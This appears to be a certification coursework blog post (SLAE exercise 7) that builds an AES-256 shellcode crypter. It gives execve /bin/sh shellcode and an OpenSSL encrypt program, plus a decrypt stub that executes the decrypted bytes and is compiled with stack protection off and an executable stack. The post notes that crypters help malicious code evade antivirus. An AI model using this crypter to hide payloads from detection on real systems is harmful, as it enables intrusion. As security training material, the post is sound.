---
layout: post
title: "SLAE Problem 7: Create a Custom Crypter"
description: "SLAE Problem 7: Create a Custom Crypter"
tags: [asm, shellcode, crypter]
---

This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
[<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert)

Student ID: SLAE-824

## Requirements

- Create a custom crypter like the one shown in the "crypters" video
- Free to use any encryption schema
- Use any programming language

The code for this exercise can be found [here](https://github.com/blischalk/slae/tree/master/exercise7).

## Background: Crypters and Packers

So what is a Crypter or a Packer? From what I have read crypters and
packers are quite similar. While the lines between them can blur a
packer generally deals with compression and obfuscation and is often
used by software companies to prevent revers-engineering their
software. A crypter is focused on encryption and is a program that
has grown out of the underground community. Both crypters and packers
obfuscate code to deter reverse-engineering. By utilizing a crypter or
packer on malicious code an attacker can increase their chances of
bypassing anti-virus fingerprint/signature based detection.

## Strategy

For this last SLAE problem I decided that I wanted to try and use AES
256-bit encryption for my shellcode crypter. I found some sample c code
[here](https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption)
which illustrates how to use the openssl c library for
encryption/decryption. The strategy will be as follows:

1. Create an encrypt and decrypt c program using the sample code
   provided in the above link as a guide
2. Add the `execve /bin/sh` shellcode from the SLAE course into the
   encrypt c program
3. Encrypt the shellcode using the AES encryption and get an
   encrypted shellcode output
4. Place the encrypted shellcode within the decrypt program
5. Setup the decrypt program so that a function pointer points to the
   decrypted shellcode and executes it

Lets write the code.

## The Code

The assembly for the `execve /bin/sh` shellcode was the following:

{% highlight nasm %}
; Filename: execve.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

	jmp short call_shellcode


shellcode:

	pop esi

	xor ebx, ebx
	mov byte [esi +7], bl
	mov dword [esi +8], esi
	mov dword [esi +12], ebx


	lea ebx, [esi]

	lea ecx, [esi +8]

	lea edx, [esi +12]

	xor eax, eax
	mov al, 0xb
	int 0x80

call_shellcode:

	call shellcode
	message db "/bin/shABBBBCCCC"

{% endhighlight %}

We compile and link the shellcode using the provided `compile.sh` script:

{% highlight bash %}

#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'

{% endhighlight %}


{% highlight bash %}

./compile.sh execve

{% endhighlight %}

We proceed to get the shellcode using our `dumpsc` function we wrote
in the previous exercise:

{% highlight bash %}

function dumpsc {
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
}
{% endhighlight %}

{% highlight bash %}

$ dumpsc execve
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

{% endhighlight %}

Now we have the shellcode. We proceed to write the `aesencrypt.c`
program. Most of the code is a straight reproduction of the openssl
example code with the subtraction of the decryption functionality and
the addition of our shellcode:

{% highlight c %}

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
  unsigned char *iv, unsigned char *ciphertext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int ciphertext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

  /* Initialise the encryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be encrypted, and obtain the encrypted output.
   * EVP_EncryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
    handleErrors();
  ciphertext_len = len;

  /* Finalise the encryption. Further ciphertext bytes may be written at
   * this stage.
   */
  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
  ciphertext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}


int main (void)
{
  /* Set up the key and iv. Do I need to say to not hard code these in a
   * real application? :-)
   */

  /* A 256 bit key */
  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"01234567890123456";

  /* Shellcode to be encrypted */
  unsigned char *plaintext =
                (unsigned char *)"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

  /* Buffer for ciphertext. Ensure the buffer is long enough for the
   * ciphertext which may be longer than the plaintext, dependant on the
   * algorithm and mode
   */
  unsigned char ciphertext[128];

  int ciphertext_len;

  /* Initialise the library */
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  /* Encrypt the plaintext */
  ciphertext_len = encrypt (plaintext, strlen ((char *)plaintext), key, iv,
                            ciphertext);


  int counter;
  printf("Dumping Original Shellcode\n\n\n\"");
  for (counter=0; counter< strlen(plaintext); counter++)
  {
      printf("\\x%02x",plaintext[counter]);

  }

  printf("\"\n\n");

  printf("Dumping AES Encrypted Shellcode\n\n\n\"");

  for (counter=0; counter< ciphertext_len; counter++)
  {
      printf("\\x%02x",ciphertext[counter]);

  }

  printf("\"\n\n");

  /* Clean up */
  EVP_cleanup();
  ERR_free_strings();

  return 0;
}

{% endhighlight %}

When we compile this shellcode we need to remember to link the openssl library:

{% highlight bash %}

gcc aesencrypt.c -o aesencrypt -lcrypto

{% endhighlight %}

When we run the encryption program we see the following output:

{% highlight bash %}

$ ./aesencrypt
Dumping Original Shellcode

"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

Dumping AES Encrypted Shellcode

"\x47\xfe\x57\xcc\x1f\xd0\x4a\xf5\x34\x3e\x92\x8c\x9e\xc5\x05\x3d\xc0\xc6\x94\x48\x43\x0a\xb3\x62\xc2\x49\xef\x1d\x8b\x6a\x5e\x39\xf8\xb4\xd4\x29\xa1\x09\xfc\x99\x61\xa2\x2d\xa2\xc9\x81\x1a\x81\x9e\x3c\xf9\x7d\xb1\x3e\x5f\xde\xce\xfe\x5e\x9d\xf0\xd6\x7b\x0e"

{% endhighlight %}

We can see our original shellcode and the encrypted version as
well. The next task is to write our decryption program and add the
encrypted shellcode to it. Once again, most of the decryption code is
just reproduced from the openssl example but I have modified it to
remove the encryption related code and instead of printing out the
decrypted text I instead cast it to a function pointer and execute it
as our usual c stub programs have done:


{% highlight c %}

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
  unsigned char *iv, unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int plaintext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

  /* Initialise the decryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
    handleErrors();
  plaintext_len = len;

  /* Finalise the decryption. Further plaintext bytes may be written at
   * this stage.
   */
  if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
  plaintext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return plaintext_len;
}

int main (void)
{
  /* Set up the key and iv. Do I need to say to not hard code these in a
   * real application? :-)
   */

  /* A 256 bit key */
  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"01234567890123456";

  /* Shellcode to be decrypted */
  unsigned char *ciphertext =
                (unsigned char *)"\x47\xfe\x57\xcc\x1f\xd0\x4a\xf5\x34\x3e\x92\x8c\x9e\xc5\x05\x3d\xc0\xc6\x94\x48\x43\x0a\xb3\x62\xc2\x49\xef\x1d\x8b\x6a\x5e\x39\xf8\xb4\xd4\x29\xa1\x09\xfc\x99\x61\xa2\x2d\xa2\xc9\x81\x1a\x81\x9e\x3c\xf9\x7d\xb1\x3e\x5f\xde\xce\xfe\x5e\x9d\xf0\xd6\x7b\x0e";

  /* Buffer for the decrypted text */
  unsigned char decryptedtext[128];

  int decryptedtext_len, ciphertext_len;

  /* Initialise the library */
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  ciphertext_len = strlen((char *)ciphertext);

  /* Decrypt the ciphertext */
  decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
    decryptedtext);

  decryptedtext[decryptedtext_len] = '\0';


  int (*ret)() = (int(*)())decryptedtext;

  ret();

  /* Clean up */
  EVP_cleanup();
  ERR_free_strings();

  printf("\"\n\n");
  return 1;
}

{% endhighlight %}

When we compile this program we need to ensure once again that we link
the openssl library as well as disable stack protection and make the
stack executable:

{% highlight bash %}

gcc aesdecrypt.c -o aesdecrypt -lcrypto -fno-stack-protector -z execstack

{% endhighlight %}

Perfect. Now for the moment of truth...

## The Execution

{% highlight bash %}

$ ./aesdecrypt
$ id
uid=1000(someuser) gid=1000(someuser) groups=1000(someuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),999(vboxsf)
{% endhighlight %}

It works! We see that our original `execve /bin/sh` shellcode has
executed and we can run commands on our shell as expected.
